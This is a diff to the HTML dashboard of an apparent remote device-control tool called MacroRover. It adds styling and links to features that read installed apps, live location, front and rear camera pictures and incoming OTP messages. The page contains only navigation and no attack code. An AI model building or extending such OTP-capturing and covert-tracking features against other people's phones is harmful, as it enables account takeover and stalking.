@@ -3,27 +3,133 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dashboard Start Controlling</title>
+    <title>Dashboard: Start Controlling</title>
+    <style>
+        /* General Reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        /* Body Styling */
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #1e1e2f, #30345b);
+            color: #e0e0e0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        /* Container for content */
+        .dashboard {
+            background-color: #252539;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            padding: 40px;
+            max-width: 700px;
+            width: 100%;
+            text-align: center;
+            border: 1px solid #444;
+        }
+
+        /* Main Heading */
+        h1 {
+            font-size: 36px;
+            margin-bottom: 30px;
+            color: #f1f1f1;
+            letter-spacing: 1px;
+            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.4);
+        }
+
+        /* Button List Styling */
+        ul {
+            list-style: none;
+            margin-top: 20px;
+        }
+
+        li {
+            margin-bottom: 15px;
+        }
+
+        /* Button Styling */
+        button {
+            width: 100%;
+            padding: 15px 20px;
+            background-color: #3a6fda;
+            color: #fff;
+            border: none;
+            font-size: 18px;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            border: 1px solid #555;
+        }
+
+        button:hover {
+            background-color: #2950a5;
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.5);
+        }
+
+        button:active {
+            transform: translateY(1px);
+            box-shadow: none;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 28px;
+            }
+
+            button {
+                font-size: 16px;
+            }
+        }
+
+        /* Footer */
+        .footer {
+            margin-top: 40px;
+            font-size: 14px;
+            color: #888;
+            border-top: 1px solid #444;
+            padding-top: 15px;
+        }
+
+    </style>
+    
     <script>
         function redirectToNewPage(FeaturesAction) {
             window.location.href = `${FeaturesAction}`;
         }
-
-        // Add an alert on page load
-        window.onload = function() {
-            alert("Aabay gadha be sabr insaan le raw version daikh aaur jaa khush rah sirf tere liye aabhi upload krna padha hai !");
-        };
     </script>
 </head>
 <body>
-    <h1>Start Controlling Devices</h1>
-    
-    <ul>
-        <!-- Dynamically generated buttons for 30+ devices -->
-        <li><button onclick="redirectToNewPage('Feature/device_status.html')">Device Status</button></li><br>
-        <li><button onclick="redirectToNewPage('Feature/get_live_location.html')">Live Location</button></li><br>
-        <li><button onclick="redirectToNewPage('Feature/take_live_picture_and_display.html')">Take Picture And Display Rear&Front</button></li><br>
-    </ul>
+
+    <div class="dashboard">
+        <h1>Start Controlling Devices</h1>
+
+        <ul>
+            <li><button onclick="redirectToNewPage('Feature/application_get_installed_apps.html')">Get Installed Applications</button></li>
+            <li><button onclick="redirectToNewPage('Feature/application_launch_application.html')">Launch Applications</button></li>
+            <li><button onclick="redirectToNewPage('Feature/application_open_website.html')">Open Website</button></li>
+            <li><button onclick="redirectToNewPage('Feature/device_status.html')">Device Status</button></li>
+            <li><button onclick="redirectToNewPage('Feature/get_live_location.html')">Live Location</button></li>
+            <li><button onclick="redirectToNewPage('Feature/take_live_picture_and_display.html')">Take Picture And Display Rear & Front</button></li>
+            <li><button onclick="redirectToNewPage('Feature/get_otp_messages.html')">Get OTP Messages</button></li>
+            <li><button onclick="redirectToNewPage('Feature/flash_light_opration.html')">Flash Light</button></li>
+        </ul>
+
+        <div class="footer">
+            © 2024 MacroRover. All Rights Reserved.
+        </div>
+    </div>
 
 </body>
 </html>
